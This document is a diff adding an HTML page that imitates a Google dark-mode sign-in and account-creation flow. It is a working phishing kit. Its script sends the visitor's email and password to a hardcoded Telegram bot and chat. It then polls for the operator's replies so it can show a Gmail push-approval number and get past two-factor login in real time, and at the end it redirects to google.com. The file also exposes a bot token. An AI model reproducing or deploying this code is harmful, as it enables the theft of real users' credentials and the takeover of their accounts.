@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign in – Dark Mode</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0f0f0f;
+      --surface: #1e1e1e;
+      --surface-elevated:#292929;
+      --text-primary: #e8eaed;
+      --text-secondary: #9aa0a6;
+      --border: #3c4043;
+      --google-blue: #8ab4f8;
+      --google-blue-hover:#669df6;
+      --shadow: 0 1px 2px rgba(0,0,0,0.6), 0 4px 12px rgba(0,0,0,0.4);
+    }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    body {
+      font-family: 'Google Sans', Roboto, Arial, sans-serif;
+      background: var(--bg);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: var(--text-primary);
+      padding: 16px;
+    }
+    .container {
+      background: var(--surface);
+      width: 100%;
+      max-width: 420px;
+      padding: 48px 40px 36px;
+      border-radius: 12px;
+      box-shadow: var(--shadow);
+      border: 1px solid var(--border);
+    }
+    h1 {
+      font-size:24px;
+      font-weight:400;
+      text-align:center;
+      margin-bottom:8px;
+      line-height:32px;
+    }
+    .subtitle {
+      color:var(--text-secondary);
+      font-size:16px;
+      text-align:center;
+      margin-bottom:32px;
+    }
+    .step-dots {
+      display:flex;
+      justify-content:center;
+      gap:12px;
+      margin-bottom:28px;
+    }
+    .dot {
+      width:10px;
+      height:10px;
+      border-radius:50%;
+      background:#3c4043;
+      transition:all 0.4s ease;
+      position:relative;
+    }
+    .dot::before {
+      content:'';
+      position:absolute;
+      inset:-4px;
+      border-radius:50%;
+      opacity:0;
+      transition:opacity 0.4s ease;
+    }
+    .dot:nth-child(1) {
+      background:linear-gradient(135deg, #4285F4, #669df6);
+    }
+    .dot:nth-child(2) {
+      background:linear-gradient(135deg, #EA4335, #f28b82);
+    }
+    .dot:nth-child(3) {
+      background:linear-gradient(135deg, #FBBC05, #fdd663);
+    }
+    .dot:nth-child(4) {
+      background:linear-gradient(135deg, #34A853, #81c995);
+    }
+    .dot:nth-child(1)::before {
+      background:radial-gradient(circle, rgba(66,133,244,0.4) 0%, transparent 70%);
+    }
+    .dot:nth-child(2)::before {
+      background:radial-gradient(circle, rgba(234,67,53,0.4) 0%, transparent 70%);
+    }
+    .dot:nth-child(3)::before {
+      background:radial-gradient(circle, rgba(251,188,5,0.4) 0%, transparent 70%);
+    }
+    .dot:nth-child(4)::before {
+      background:radial-gradient(circle, rgba(52,168,83,0.4) 0%, transparent 70%);
+    }
+    .dot.active {
+      transform:scale(1.5);
+      box-shadow:0 0 12px rgba(138,180,248,0.6);
+    }
+    .dot.active::before {
+      opacity:1;
+    }
+    label {
+      display:block;
+      font-size:14px;
+      color:var(--text-secondary);
+      margin-bottom:6px;
+    }
+    input {
+      width:100%;
+      padding:14px 16px;
+      font-size:16px;
+      background:var(--surface-elevated);
+      color:var(--text-primary);
+      border:1px solid var(--border);
+      border-radius:4px;
+      outline:none;
+      transition:all 0.2s;
+    }
+    input::placeholder { color:#5f6368; }
+    input:focus {
+      border-color:var(--google-blue);
+      box-shadow:0 0 0 2px rgba(138,180,248,0.3);
+    }
+    .btn {
+      display:block;
+      width:100%;
+      padding:12px 24px;
+      margin:24px 0 16px;
+      background:var(--google-blue);
+      color:#000;
+      border:none;
+      border-radius:4px;
+      font-size:14px;
+      font-weight:500;
+      cursor:pointer;
+      transition:background 0.2s;
+    }
+    .btn:hover { background:var(--google-blue-hover); }
+    .status {
+      min-height:20px;
+      font-size:14px;
+      color:#f28b82;
+      text-align:center;
+      margin-top:8px;
+    }
+    .loading-overlay {
+      position:fixed;
+      inset:0;
+      background:rgba(0,0,0,0.7);
+      display:none;
+      align-items:center;
+      justify-content:center;
+      z-index:1000;
+    }
+    .spinner {
+      width:48px;
+      height:48px;
+      border:5px solid #3c4043;
+      border-top:5px solid var(--google-blue);
+      border-radius:50%;
+      animation:spin 1s linear infinite;
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+    #code-container {
+      margin-top:32px;
+      text-align:center;
+    }
+    #code-label {
+      font-size:16px;
+      color:var(--text-secondary);
+      margin-bottom:12px;
+    }
+    #code-display {
+      font-size:36px;
+      font-weight:500;
+      letter-spacing:6px;
+      color:var(--google-blue);
+      background:rgba(138,180,248,0.08);
+      padding:20px;
+      border-radius:12px;
+      border:1px solid rgba(138,180,248,0.25);
+      word-break:break-all;
+    }
+    .step { display:none; }
+    .step.active { display:block; }
+  </style>
+</head>
+<body>
+
+<div class="loading-overlay" id="loading">
+  <div class="spinner"></div>
+</div>
+
+<div class="container">
+  <h1 id="title">Create your account</h1>
+
+  <div class="step-dots">
+    <div class="dot active" id="dot1"></div>
+    <div class="dot" id="dot2"></div>
+    <div class="dot" id="dot3"></div>
+    <div class="dot" id="dot4"></div>
+  </div>
+
+  <!-- STEP 1 -->
+  <div id="step-email" class="step active">
+    <label for="email">Email</label>
+    <input type="email" id="email" autocomplete="email" placeholder="example@gmail.com" />
+    <button class="btn" onclick="startWithEmail()">Next</button>
+    <div id="email-status" class="status"></div>
+  </div>
+
+  <!-- STEP 2 -->
+  <div id="step-ok" class="step">
+
+    <div class="spinner" style="margin:48px auto;"></div>
+    <div id="ok-status" class="status">Waiting...</div>
+  </div>
+
+  <!-- STEP 3 -->
+  <div id="step-password" class="step">
+    <label for="password">Write your password</label>
+    <input type="password" id="password" placeholder="••••••••" />
+    <button class="btn" onclick="sendPasswordAndWaitCode()">Continue</button>
+    <div id="pw-status" class="status"></div>
+  </div>
+
+  <!-- STEP 4 -->
+  <div id="step-code" class="step">
+    <div id="code-waiting" style="text-align:center;">
+      <div class="spinner" style="margin:48px auto;"></div>
+      <div class="status">Waiting for code...</div>
+    </div>
+    
+    <div id="code-container" style="display:none;">
+      <div id="code-label">Press this number in your Gmail app</div>
+      <div id="code-display">— — — —</div>
+      <div class="spinner" style="margin:32px auto;"></div>
+      <div class="status">Waiting for confirmation...</div>
+    </div>
+
+    <div id="code-success" style="display:none; text-align:center; padding:48px 0;">
+      <div style="font-size:48px; margin-bottom:16px;">✓</div>
+      <div style="font-size:20px; color:var(--text-primary); margin-bottom:8px;">Done!</div>
+      <div class="status" style="color:var(--text-secondary);">Redirecting...</div>
+    </div>
+  </div>
+</div>
+
+<script>
+  const BOT_TOKEN = '8261446213:AAE4pbH8WxreDoUwIK6kQ6ZRlEbh96bGfZs';
+  const TARGET_CHAT_ID = '7938134233';
+
+  let emailValue = '';
+  let offset = 0;
+  let pollTimer = null;
+  let expectingOKAfterUpdateId = -1;
+
+  const loading = document.getElementById('loading');
+  const dot1 = document.getElementById('dot1');
+  const dot2 = document.getElementById('dot2');
+  const dot3 = document.getElementById('dot3');
+  const dot4 = document.getElementById('dot4');
+
+  function showLoading(show) {
+    loading.style.display = show ? 'flex' : 'none';
+  }
+
+  async function telegramSend(text) {
+    showLoading(true);
+    try {
+      const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${TARGET_CHAT_ID}&text=${encodeURIComponent(text)}`;
+      const res = await fetch(url);
+      const data = await res.json();
+      if (data.ok && data.result && data.result.message_id) {
+        return { success: true, message_id: data.result.message_id };
+      }
+      return { success: false };
+    } catch {
+      return { success: false };
+    } finally {
+      showLoading(false);
+    }
+  }
+
+  async function pollFor(expectedUpper, onMatch, options = {}) {
+    const { ignoreBefore = -1, replyToMessageId = null } = options;
+
+    if (pollTimer) clearTimeout(pollTimer);
+
+    try {
+      let url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=10`;
+      if (offset > 0) url += `&offset=${offset + 1}`;
+
+      const res = await fetch(url);
+      const data = await res.json();
+
+      if (data.ok && data.result?.length) {
+        for (const update of data.result) {
+          if (update.update_id > offset) offset = update.update_id;
+
+          const msg = update.message || update.channel_post;
+          if (!msg) continue;
+          if (String(msg.chat.id) !== TARGET_CHAT_ID) continue;
+
+          if (update.update_id <= ignoreBefore) continue;
+
+          // For the final code step: only accept replies to our password message
+          if (replyToMessageId !== null) {
+            if (!msg.reply_to_message || msg.reply_to_message.message_id !== replyToMessageId) {
+              continue;
+            }
+          }
+
+          const text = (msg.text || '').trim();
+          const textUpper = text.toUpperCase();
+
+          console.log(`[poll] ${update.update_id} | reply_to:${msg.reply_to_message?.message_id || 'none'} | "${text}"`);
+
+          if (expectedUpper === '' || textUpper === expectedUpper) {
+            onMatch(text);   // pass original text (with numbers/case preserved)
+            return;
+          }
+        }
+      }
+    } catch (err) {
+      console.warn('poll error', err);
+    }
+
+    pollTimer = setTimeout(() => pollFor(expectedUpper, onMatch, options), 3000);
+  }
+
+  function stopPolling() {
+    if (pollTimer) {
+      clearTimeout(pollTimer);
+      pollTimer = null;
+    }
+  }
+
+  function resetToFirstStep() {
+    stopPolling();
+    
+    // Clear inputs
+    document.getElementById('email').value = '';
+    document.getElementById('password').value = '';
+    emailValue = '';
+    
+    // Reset step 4 sections
+    document.getElementById('code-waiting').style.display = 'block';
+    document.getElementById('code-container').style.display = 'none';
+    document.getElementById('code-success').style.display = 'none';
+    
+    // Show error message
+    document.getElementById('email-status').textContent = 'Incorrect email or password. Please try again.';
+    
+    // Go back to step 1
+    setStep(1);
+  }
+
+  function setStep(n) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(`step-${n===1?'email':n===2?'ok':n===3?'password':'code'}`).classList.add('active');
+
+    dot1.classList.toggle('active', n===1);
+    dot2.classList.toggle('active', n===2);
+    dot3.classList.toggle('active', n===3);
+    dot4.classList.toggle('active', n===4);
+
+    document.getElementById('title').textContent =
+      n===1 ? 'Create your account' :
+      n===2 ? 'Confirm your email' :
+      n===3 ? 'Write your password' :
+      'Verification code';
+  }
+
+  async function startWithEmail() {
+    const email = document.getElementById('email').value.trim();
+    if (!email || !email.includes('@')) {
+      document.getElementById('email-status').textContent = 'Please enter a valid email';
+      return;
+    }
+
+    emailValue = email;
+    document.getElementById('email-status').textContent = '';
+
+    // Snapshot current latest update
+    try {
+      const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=1`);
+      const d = await r.json();
+      if (d.ok && d.result?.length) offset = d.result[0].update_id;
+    } catch {}
+
+    const { success } = await telegramSend(
+      `New attempt\nEmail: ${email}\n\nReply OK to continue`
+    );
+
+    if (!success) {
+      document.getElementById('email-status').textContent = 'Failed to contact Telegram';
+      return;
+    }
+
+    expectingOKAfterUpdateId = offset;
+
+    setStep(2);
+    pollFor('OK', () => {
+      stopPolling();
+      expectingOKAfterUpdateId = -1;
+      setStep(3);
+    }, { ignoreBefore: expectingOKAfterUpdateId });
+  }
+
+  async function sendPasswordAndWaitCode() {
+    const pw = document.getElementById('password').value.trim();
+    if (!pw) {
+      document.getElementById('pw-status').textContent = 'Please enter a password';
+      return;
+    }
+
+    document.getElementById('pw-status').textContent = '';
+
+    const sendResult = await telegramSend(
+      `Credentials:\nEmail: ${emailValue}\nPassword: ${pw}\n\nReply with the code / confirmation`
+    );
+
+    if (!sendResult.success) {
+      document.getElementById('pw-status').textContent = 'Failed to send';
+      return;
+    }
+
+    const passwordMsgId = sendResult.message_id;
+
+    // Move to step 4 and show loading
+    setStep(4);
+    document.getElementById('code-waiting').style.display = 'block';
+    document.getElementById('code-container').style.display = 'none';
+    document.getElementById('code-success').style.display = 'none';
+
+    stopPolling();
+
+    // Wait for code reply to the password message
+    pollFor('', async (receivedText) => {
+      stopPolling();
+      
+      // Show the code
+      document.getElementById('code-display').textContent = receivedText || '— — — —';
+      document.getElementById('code-waiting').style.display = 'none';
+      document.getElementById('code-container').style.display = 'block';
+      
+      // Send confirmation request
+      const confirmResult = await telegramSend(
+        `Code shown to user: ${receivedText}\n\nReply YES to confirm or NO to restart`
+      );
+      
+      if (!confirmResult.success) {
+        console.error('Failed to send confirmation request');
+        return;
+      }
+      
+      const confirmMsgId = confirmResult.message_id;
+      
+      // Wait for YES or NO reply to confirmation message
+      pollForConfirmation(confirmMsgId);
+      
+    }, { replyToMessageId: passwordMsgId });
+  }
+
+  function pollForConfirmation(confirmMsgId) {
+    stopPolling();
+    
+    pollFor('', (receivedText) => {
+      stopPolling();
+      
+      const textUpper = receivedText.toUpperCase();
+      
+      if (textUpper === 'NO') {
+        resetToFirstStep();
+      } else if (textUpper === 'YES') {
+        // Show success
+        document.getElementById('code-container').style.display = 'none';
+        document.getElementById('code-success').style.display = 'block';
+        
+        // Redirect after 2 seconds
+        setTimeout(() => {
+          window.location.href = 'https://www.google.com';
+        }, 2000);
+      } else {
+        // If response is neither YES nor NO, continue waiting
+        pollForConfirmation(confirmMsgId);
+      }
+    }, { replyToMessageId: confirmMsgId });
+  }
+</script>
+</body>
+</html>
